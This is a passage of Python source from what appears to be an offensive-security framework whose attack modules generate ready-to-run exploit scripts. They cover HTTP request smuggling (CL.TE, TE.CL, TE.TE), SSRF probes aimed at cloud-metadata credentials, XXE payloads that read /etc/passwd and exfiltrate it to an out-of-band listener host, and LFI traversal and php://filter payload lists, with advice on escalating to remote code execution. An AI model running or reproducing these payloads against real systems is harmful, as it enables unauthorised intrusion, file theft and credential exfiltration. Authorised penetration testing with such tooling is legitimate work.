    stdev_b = statistics.stdev(times_b) if len(times_b) > 1 else 0
    diff = abs(mean_a - mean_b)

    significant = diff > THRESHOLD_MS and diff > (stdev_a + stdev_b)
    return {{
        "name": name,
        "mean_a_ms": round(mean_a, 2),
        "mean_b_ms": round(mean_b, 2),
        "diff_ms": round(diff, 2),
        "significant": significant,
        "stdev_a": round(stdev_a, 2),
        "stdev_b": round(stdev_b, 2),
    }}

print(f"=== Timing Oracle Detection: {{BASE}} ===\\n")

# Test 1: User enumeration via login
print("[1] Login Timing — valid vs invalid user...")
valid_user_times = measure_request(
    f"{{BASE}}/api/login",
    data=json.dumps({{"username": "admin", "password": "wrongpass"}}).encode(),
    headers={{"Content-Type": "application/json"}},
)
invalid_user_times = measure_request(
    f"{{BASE}}/api/login",
    data=json.dumps({{"username": "nonexistent_user_xyz_123", "password": "test"}}).encode(),
    headers={{"Content-Type": "application/json"}},
)
result = analyze_timing("Login Enumeration", valid_user_times, invalid_user_times)
print(f"  Valid user mean: {{result['mean_a_ms']}}ms, Invalid: {{result['mean_b_ms']}}ms, Diff: {{result['diff_ms']}}ms")
if result["significant"]:
    print(f"  [+] TIMING ORACLE DETECTED! Usernames can be enumerated via timing.")
else:
    print(f"  [-] No significant timing difference.")

# Test 2: Password reset timing
print("\\n[2] Password Reset Timing — existing vs non-existing email...")
exist_times = measure_request(
    f"{{BASE}}/api/reset-password",
    data=json.dumps({{"email": "admin@example.com"}}).encode(),
    headers={{"Content-Type": "application/json"}},
)
noexist_times = measure_request(
    f"{{BASE}}/api/reset-password",
    data=json.dumps({{"email": "noexist_xyz_123@example.com"}}).encode(),
    headers={{"Content-Type": "application/json"}},
)
result = analyze_timing("Password Reset", exist_times, noexist_times)
print(f"  Exist mean: {{result['mean_a_ms']}}ms, No-exist: {{result['mean_b_ms']}}ms, Diff: {{result['diff_ms']}}ms")
if result["significant"]:
    print(f"  [+] TIMING ORACLE DETECTED! Email enumeration via password reset.")
else:
    print(f"  [-] No significant timing difference.")

# Test 3: API key / token validation
print("\\n[3] Token Validation Timing — valid prefix vs random...")
valid_prefix_times = measure_request(
    f"{{BASE}}/api/validate",
    data=json.dumps({{"token": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"}}).encode(),
    headers={{"Content-Type": "application/json"}},
)
random_times = measure_request(
    f"{{BASE}}/api/validate",
    data=json.dumps({{"token": "x" * 100}}).encode(),
    headers={{"Content-Type": "application/json"}},
)
result = analyze_timing("Token Validation", valid_prefix_times, random_times)
print(f"  Valid prefix mean: {{result['mean_a_ms']}}ms, Random: {{result['mean_b_ms']}}ms, Diff: {{result['diff_ms']}}ms")
if result["significant"]:
    print(f"  [+] TIMING ORACLE DETECTED! Token validation leaks information.")
else:
    print(f"  [-] No significant timing difference.")

print("\\n[!] Timing oracles can be exploited for blind data extraction (e.g., blind SQLi character-by-character).")
'''


class RequestSmuggling(AttackModule):
    name = "RequestSmuggling"
    description = "HTTP request smuggling detection and exploitation (CL.TE, TE.CL, TE.TE)"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443]
    required_cves = []
    # Capability metadata: smuggling detection; a confirmed desync can poison
    # caches / hijack requests but surfaces as a finding, not an artifact.
    requires: list[str] = []
    produces: list[str] = []
    read_only = False
    cost = "medium"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Tests CL.TE, TE.CL, and TE.TE smuggling variants. Can poison caches and hijack requests.",
            "evidence": [f"request-smuggling probes queued against {ctx.target_ip}"],
            "references": [
                "https://portswigger.net/web-security/request-smuggling",
                "https://book.hacktricks.wiki/en/pentesting-web/http-request-smuggling.html",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""HTTP Request Smuggling Detector — CL.TE / TE.CL / TE.TE attacks."""
import socket, ssl, sys, time

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
USE_TLS = PORT in (443, 8443)

def send_raw(host: str, port: int, payload: bytes, use_tls: bool = False) -> bytes:
    """Send raw HTTP bytes and return response."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    if use_tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    sock.connect((host, port))
    sock.sendall(payload)
    time.sleep(1)
    response = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
    sock.close()
    return response

def test_cl_te(host: str, port: int, use_tls: bool) -> dict:
    """CL.TE: Content-Length vs Transfer-Encoding mismatch (front-end uses CL, back-end uses TE)."""
    payload = (
        f"POST / HTTP/1.1\\r\\n"
        f"Host: {{host}}\\r\\n"
        f"Content-Length: 6\\r\\n"
        f"Transfer-Encoding: chunked\\r\\n"
        f"\\r\\n"
        f"0\\r\\n"
        f"\\r\\n"
        f"G"
    ).encode()
    response = send_raw(host, port, payload, use_tls)
    text = response.decode(errors="replace")
    # If back-end uses TE, it sees "0\\r\\n\\r\\nG" — the "G" is left in the buffer
    # causing a timeout or error on the next request
    return {{"type": "CL.TE", "response_len": len(response), "response_preview": text[:300]}}

def test_te_cl(host: str, port: int, use_tls: bool) -> dict:
    """TE.CL: Transfer-Encoding vs Content-Length mismatch (front-end uses TE, back-end uses CL)."""
    payload = (
        f"POST / HTTP/1.1\\r\\n"
        f"Host: {{host}}\\r\\n"
        f"Content-Length: 4\\r\\n"
        f"Transfer-Encoding: chunked\\r\\n"
        f"\\r\\n"
        f"5c\\r\\n"
        f"GPOST / HTTP/1.1\\r\\n"
        f"Host: {{host}}\\r\\n"
        f"Content-Length: 15\\r\\n"
        f"\\r\\n"
        f"x=1\\r\\n"
        f"0\\r\\n"
        f"\\r\\n"
    ).encode()
    response = send_raw(host, port, payload, use_tls)
    text = response.decode(errors="replace")
    return {{"type": "TE.CL", "response_len": len(response), "response_preview": text[:300]}}

def test_te_te(host: str, port: int, use_tls: bool) -> dict:
    """TE.TE: Obfuscated Transfer-Encoding header to confuse one proxy."""
    payload = (
        f"POST / HTTP/1.1\\r\\n"
        f"Host: {{host}}\\r\\n"
        f"Content-Length: 4\\r\\n"
        f"Transfer-Encoding: chunked\\r\\n"
        f"Transfer-encoding: x\\r\\n"
        f"\\r\\n"
        f"5c\\r\\n"
        f"GPOST / HTTP/1.1\\r\\n"
        f"Host: {{host}}\\r\\n"
        f"\\r\\n"
        f"0\\r\\n"
        f"\\r\\n"
    ).encode()
    response = send_raw(host, port, payload, use_tls)
    text = response.decode(errors="replace")
    return {{"type": "TE.TE", "response_len": len(response), "response_preview": text[:300]}}

print(f"=== HTTP Request Smuggling Detection: {{TARGET}}:{{PORT}} ===\\n")

# Baseline
print("[0] Baseline request...")
baseline = send_raw(
    TARGET, PORT,
    f"POST / HTTP/1.1\\r\\nHost: {{TARGET}}\\r\\nContent-Length: 0\\r\\n\\r\\n".encode(),
    USE_TLS,
)
print(f"  Baseline response: {{len(baseline)}} bytes")

# Run tests
tests = [
    ("CL.TE", test_cl_te),
    ("TE.CL", test_te_cl),
    ("TE.TE", test_te_te),
]

for name, test_fn in tests:
    print(f"\\n[Test] {{name}}...")
    try:
        result = test_fn(TARGET, PORT, USE_TLS)
        print(f"  Response: {{result['response_len']}} bytes")
        print(f"  Preview: {{result['response_preview'][:200]}}")

        # Heuristic: if response differs significantly from baseline, smuggling may exist
        if abs(result["response_len"] - len(baseline)) > 200:
            print(f"  [!] Response differs from baseline — possible {{name}} smuggling!")
        if "Unrecognized method" in result["response_preview"] or "GPOST" in result["response_preview"]:
            print(f"  [+] SMUGGLING CONFIRMED! Back-end saw smuggled 'GPOST' request!")
    except Exception as e:
        print(f"  Error: {{e}}")

print("\\n[!] Confirmed smuggling can be used for cache poisoning, request hijacking, and auth bypass.")
'''


# ---------------------------------------------------------------------------
# Server-Side Request Forgery / XML External Entity / Local File Inclusion
# ---------------------------------------------------------------------------


class SSRFProbe(AttackModule):
    name = "SSRFProbe"
    description = "Server-Side Request Forgery detection — inject internal-URL payloads into fetch/proxy parameters and detect reflected internal content (cloud metadata, loopback services)"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443, 3000, 5000]
    required_cves = []
    # Capability metadata: SSRF detection; metadata-cred exfiltration is a
    # downstream step, the probe itself surfaces a finding.
    requires: list[str] = []
    produces: list[str] = []
    read_only = False
    cost = "medium"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Injects internal-target URLs (loopback, link-local metadata, internal service ports) into fetch/proxy params on ctx.target_ip. The target is asked to fetch — no third-party pivot.",
            "evidence": [f"SSRF probes queued against {ctx.target_ip}"],
            "references": [
                "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                "https://portswigger.net/web-security/ssrf",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""SSRF Probe — inject internal-URL payloads into fetch/proxy parameters on the target."""
import sys, urllib.request, urllib.parse, urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
SCHEME = "https" if PORT in (443, 8443) else "http"
BASE = f"{{SCHEME}}://{{TARGET}}:{{PORT}}"

# Candidate URL-fetch parameters observed in real SSRF sinks
PARAMS = ["url", "target", "next", "dest", "redirect", "image", "fetch", "file", "path", "uri"]
# Common endpoints that accept a URL/fetch parameter
ENDPOINTS = ["/", "/fetch", "/proxy", "/api/fetch", "/load", "/preview", "/pdf", "/import"]

# Internal payloads — these are fetched BY the target (ctx.target_ip), not by us.
# 169.254.169.254 is the cloud metadata endpoint internal to the target's cloud
# environment; the probe asks the target to fetch it, which is SSRF against the
# target itself, not a pivot to a third-party host.
PAYLOADS = [
    "http://127.0.0.1/",
    "http://localhost:6379/",
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:80/",
    "http://[::1]/",
]

# Markers that indicate the target fetched an internal resource
INTERNAL_MARKERS = ["ami-", "instance-id", "redis", "instance-type",
                    "security-credentials", "i-am", "RESQUE", "PONG",
                    "+PONG", "redis_version", "WALLOPS"]

def probe(url: str) -> str:
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.read(8192).decode(errors="replace")
    except urllib.error.HTTPError as e:
        try:
            return e.read(8192).decode(errors="replace")
        except Exception:
            return ""
    except Exception:
        return ""

print(f"=== SSRF Probe: {{BASE}} ===\\n")

hits = 0
for ep in ENDPOINTS:
    for param in PARAMS:
        for payload in PAYLOADS:
            full = f"{{BASE}}{{ep}}?{{param}}={{urllib.parse.quote(payload, safe='')}}"
            body = probe(full)
            if not body:
                continue
            for marker in INTERNAL_MARKERS:
                if marker.lower() in body.lower():
                    print(f"[+] SSRF HIT: {{ep}}?{{param}}=... -> marker '{{marker}}' in response")
                    print(f"    payload: {{payload}}")
                    print(f"    snippet: {{body[:200]!r}}")
                    hits += 1
                    break
            # Also flag direct reflection of the payload URL in the body
            if payload in body:
                print(f"[?] REFLECTION: {{ep}}?{{param}}= reflected payload {{payload}}")
                hits += 1

if hits == 0:
    print("[-] No SSRF indicators found on common endpoints/params.")
else:
    print(f"\\n[!] {{hits}} SSRF indicator(s) found. Confirm manually and escalate to RCE via metadata creds or internal services.")

print("\\n[!] Cloud metadata (169.254.169.254) is fetched BY the target — this probes the target's own cloud env, not a third-party host.")
'''


class XXEProbe(AttackModule):
    name = "XXEProbe"
    description = "XML External Entity injection detection — in-band file read via file:// and OOB entity exfiltration against XML-accepting endpoints"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443, 3000, 5000]
    required_cves = []
    # Capability metadata: XXE file-read/exfil detection; surfaces a finding
    # (file content / OOB callback), not a durable foothold artifact.
    requires: list[str] = []
    produces: list[str] = []
    read_only = False
    cost = "medium"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "POSTs in-band (file:// /etc/passwd) and OOB external-entity XML payloads to XML-accepting endpoints on ctx.target_ip. Set the OOB listener host before running the OOB variant.",
            "evidence": [f"XXE probes queued against {ctx.target_ip}"],
            "references": [
                "https://owasp.org/www-community/attacks/XML_External_Entity_(XXE)_Processing",
                "https://portswigger.net/web-security/xxe",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""XXE Probe — in-band and OOB external entity injection against the target."""
import sys, urllib.request, urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
SCHEME = "https" if PORT in (443, 8443) else "http"
BASE = f"{{SCHEME}}://{{TARGET}}:{{PORT}}"

# Operator sets this to their own OOB listener host (e.g. attacker.example or
# the operator-box callback IP). Default placeholder is a non-resolving name so
# the OOB probe is safe to run without a listener; entities will still be
# parsed by the target, producing detectable errors/timeouts.
OOB_HOST = "xxe-listener.operator.example"
OOB_PORT = 8888

ENDPOINTS = ["/", "/api/xml", "/import", "/upload", "/soap"]

# (a) In-band external entity reading /etc/passwd via file://
INBAND_XML = (
    '<?xml version="1.0" encoding="UTF-8"?>\\n'
    '<!DOCTYPE foo [\\n'
    '  <!ELEMENT foo ANY>\\n'
    '  <!ENTITY xxe SYSTEM "file:///etc/passwd">\\n'
    ']>\\n'
    '<foo>&xxe;</foo>\\n'
)

# (b) OOB external entity — parameter entity pulls from attacker-controlled URL.
# The target resolves OOB_HOST and tries to fetch from it; exfiltration happens
# via the parameter entity referencing the attacker URL. The operator must run
# an OOB listener (e.g. Burp Collaborator, responder) and set OOB_HOST.
OOB_XML = (
    '<?xml version="1.0" encoding="UTF-8"?>\\n'
    '<!DOCTYPE foo [\\n'
    '  <!ELEMENT foo ANY>\\n'
    '  <!ENTITY % ext SYSTEM "http://{{OOB_HOST}}:{{OOB_PORT}}/xxe.dtd">\\n'
    '  %ext;\\n'
    ']>\\n'
    '<foo>xxe-oob-probe</foo>\\n'
)

# Optional: a secondary OOB payload that exfiltrates /etc/passwd via a
# parameter-entity-defined entity routed to the attacker listener.
OOB_EXFIL_XML = (
    '<?xml version="1.0" encoding="UTF-8"?>\\n'
    '<!DOCTYPE foo [\\n'
    '  <!ENTITY % file SYSTEM "file:///etc/passwd">\\n'
    '  <!ENTITY % dtd SYSTEM "http://{{OOB_HOST}}:{{OOB_PORT}}/exfil.dtd">\\n'
    '  %dtd;\\n'
    ']>\\n'
    '<foo>xxe-oob-exfil-probe</foo>\\n'
)

ENTITY_MARKERS = ["DOCTYPE", "entity", "root:", "/bin/", "bin/bash", "XMLError",
                  "EntityRef", "external entity", "FAILED to load external"]

def post_xml(url: str, body: str, content_type: str) -> str:
    data = body.encode()
    try:
        req = urllib.request.Request(url, data=data, headers={{"Content-Type": content_type}}, method="POST")
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.read(8192).decode(errors="replace")
    except urllib.error.HTTPError as e:
        try:
            return e.read(8192).decode(errors="replace")
        except Exception:
            return ""
    except Exception as e:
        return f"<err:{{e}}>"

print(f"=== XXE Probe: {{BASE}} ===\\n")

print("[1] In-band file:// /etc/passwd probe (application/xml)...")
inband_hits = 0
for ep in ENDPOINTS:
    body = post_xml(f"{{BASE}}{{ep}}", INBAND_XML, "application/xml")
    if not body:
        continue
    for marker in ENTITY_MARKERS:
        if marker.lower() in body.lower():
            print(f"  [+] HIT {{ep}} (application/xml): marker '{{marker}}'")
            print(f"      snippet: {{body[:300]!r}}")
            inband_hits += 1
            break
    if "root:" in body:
        print(f"  [+] /etc/passwd content reflected at {{ep}} — in-band XXE CONFIRMED")
        inband_hits += 1

print("\\n[2] In-band probe (text/xml)...")
for ep in ENDPOINTS:
    body = post_xml(f"{{BASE}}{{ep}}", INBAND_XML, "text/xml")
    if body and ("root:" in body or "bin/bash" in body):
        print(f"  [+] HIT {{ep}} (text/xml): /etc/passwd content reflected")
        inband_hits += 1

print("\\n[3] OOB external-entity probe (operator must set OOB_HOST listener)...")
print(f"    OOB listener configured as: http://{{OOB_HOST}}:{{OOB_PORT}}")
oob_hits = 0
for ep in ENDPOINTS:
    body = post_xml(f"{{BASE}}{{ep}}", OOB_XML, "application/xml")
    if body:
        for marker in ENTITY_MARKERS:
            if marker.lower() in body.lower():
                print(f"  [?] {{ep}}: entity-parsing marker '{{marker}}' (check OOB listener for callback)")
                oob_hits += 1
                break

print("\\n[4] OOB exfil probe (parameter entity + external DTD)...")
for ep in ENDPOINTS:
    body = post_xml(f"{{BASE}}{{ep}}", OOB_EXFIL_XML, "application/xml")
    if body and ("DOCTYPE" in body or "entity" in body.lower()):
        print(f"  [?] {{ep}}: OOB exfil payload accepted — check listener for /etc/passwd callback")
        oob_hits += 1

total = inband_hits + oob_hits
if total == 0:
    print("\\n[-] No XXE indicators found.")
else:
    print(f"\\n[!] {{total}} XXE indicator(s). In-band hits confirm file read; OOB hits require listener callback to confirm exfil.")
'''


class LFITraversal(AttackModule):
    name = "LFITraversal"
    description = "Local File Inclusion / path traversal detection — inject traversal and php://filter payloads into file/include parameters and detect /etc/passwd content"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443, 3000, 5000]
    required_cves = []
    # Capability metadata: LFI/traversal detection; surfaces a file-read
    # finding, escalates to RCE via log poisoning / wrappers downstream.
    requires: list[str] = []
    produces: list[str] = []
    read_only = False
    cost = "medium"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Injects ../, ....//, %2f, absolute-path, and php://filter traversal payloads into file/include params on ctx.target_ip. Flags responses containing /etc/passwd content or base64-looking output.",
            "evidence": [f"LFI/traversal probes queued against {ctx.target_ip}"],
            "references": [
                "https://owasp.org/www-community/attacks/Path_Traversal",
                "https://portswigger.net/web-security/file-path-traversal",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""LFI / Path Traversal Probe — inject traversal payloads into file parameters on the target."""
import sys, re, urllib.request, urllib.parse, urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
SCHEME = "https" if PORT in (443, 8443) else "http"
BASE = f"{{SCHEME}}://{{TARGET}}:{{PORT}}"

# Common file/include-style parameters
PARAMS = ["file", "page", "path", "include", "template", "doc", "image", "cat", "content"]
# Endpoints that commonly map a parameter to a filesystem path
ENDPOINTS = ["/", "/index.php", "/page", "/view", "/include", "/download"]

# Traversal payloads targeting /etc/passwd on the target's own filesystem.
# These traverse the TARGET's filesystem, not any third-party host.
PAYLOADS = [
    "../../../etc/passwd",
    "../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/convert.base64-encode/resource=../../../etc/passwd",
    "....\\\\....\\\\....\\\\etc/passwd",
    "file:///etc/passwd",
]

# Markers that indicate the target read /etc/passwd
PASSWD_MARKERS = ["root:", "bin/bash", "bin/sh", "/sbin/nologin", "daemon:"]
# Base64-looking content (php://filter base64 output) — long base64 blob
B64_RE = re.compile(r"[A-Za-z0-9+/]{{40,}}={{0,2}}")

def fetch(url: str) -> str:
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.read(16384).decode(errors="replace")
    except urllib.error.HTTPError as e:
        try:
            return e.read(16384).decode(errors="replace")
        except Exception:
            return ""
    except Exception:
        return ""

print(f"=== LFI / Traversal Probe: {{BASE}} ===\\n")

hits = 0
for ep in ENDPOINTS:
    for param in PARAMS:
        for payload in PAYLOADS:
            full = f"{{BASE}}{{ep}}?{{param}}={{urllib.parse.quote(payload, safe='')}}"
            body = fetch(full)
            if not body:
                continue
            matched = None
            for marker in PASSWD_MARKERS:
                if marker in body:
                    matched = marker
                    break
            b64_match = B64_RE.search(body) if "base64" in payload else None
            if matched:
                print(f"[+] LFI HIT: {{ep}}?{{param}}= -> marker '{{matched}}'")
                print(f"    payload: {{payload}}")
                print(f"    snippet: {{body[:300]!r}}")
                hits += 1
            elif b64_match:
                print(f"[+] LFI HIT (b64): {{ep}}?{{param}}= -> base64 blob (php://filter output)")
                print(f"    payload: {{payload}}")
                print(f"    blob: {{b64_match.group(0)[:120]}}...")
                hits += 1

if hits == 0:
    print("[-] No LFI/traversal indicators found on common endpoints/params.")
else:
    print(f"\\n[!] {{hits}} LFI indicator(s). Decode any base64 blobs; escalate to log poisoning or RCE via wrappers (php://input, expect://).")

print("\\n[!] Traversal targets the ctx.target_ip host filesystem only — no third-party pivot.")
'''


# ---------------------------------------------------------------------------
# Credential Attack Amplifier Modules
# ---------------------------------------------------------------------------
